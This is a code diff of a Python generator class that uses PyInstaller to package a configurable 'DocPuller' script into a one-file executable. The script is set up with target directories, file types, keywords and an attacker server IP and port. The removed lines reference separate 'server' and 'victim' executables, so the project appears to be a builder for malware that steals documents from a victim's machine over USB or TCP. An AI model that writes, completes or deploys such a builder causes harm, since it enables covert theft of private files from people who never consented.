@@ -1,6 +1,6 @@
 import subprocess
 
-from Generator.FronzenObjectsGeneartor import FrozenObjectGeneartor
+from Generator.DocPullerScriptGenerator import ScriptGen
 
 
 class DocPullerGenerator:
@@ -14,9 +14,7 @@ class DocPullerGenerator:
         self.keywords = keywords
         self.server_ip = server_ip
         self.server_port = server_port
-        self.DOCPULLER_USB_EXE_PATH = r'DocPullerScriptsToExe/DocPullerUSB_Exe.py'
-        self.DOCPULLER_FTP_SERVER_EXE_PATH = 'DocPullerScriptsToExe/DocPullerTCP_Server_Exe.py'
-        self.DOCPULLER_FTP_VICTIM_EXE_PATH = 'DocPullerScriptsToExe/DocPullerTCP_Victim_Exe.py'
+        self.DOCPULLER_SCRIPT = 'docpullerscrip.py'
 
         # Specify additional PyInstaller options if needed
         self.options = [
@@ -26,20 +24,14 @@ class DocPullerGenerator:
             f'--add-data /DocPullerScripts'
         ]
 
-        FrozenObjectGeneartor(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).main()
+        ScriptGen(is_usb, direcoties, file_type, date, keywords, server_ip, server_port).write_to_file()
 
     def main(self):
         if self.is_usb:
             print('genarating exe')
 
-            command = ["pyinstaller",'--onefile',f"--distpath={self.save_dir}",f'--add-data /DocPullerScripts',self.DOCPULLER_USB_EXE_PATH]
+            command = ["pyinstaller",'--console','--onefile',f"--distpath={self.save_dir}",self.DOCPULLER_SCRIPT]
             nig=subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              universal_newlines=True)
+            nig.communicate()
             print(nig)
-        else:
-            command = ["pyinstaller", self.DOCPULLER_FTP_SERVER_EXE_PATH] + self.options
-            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                             universal_newlines=True)
-            command = ["pyinstaller", self.DOCPULLER_FTP_VICTIM_EXE_PATH] + self.options
-            subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                             universal_newlines=True)
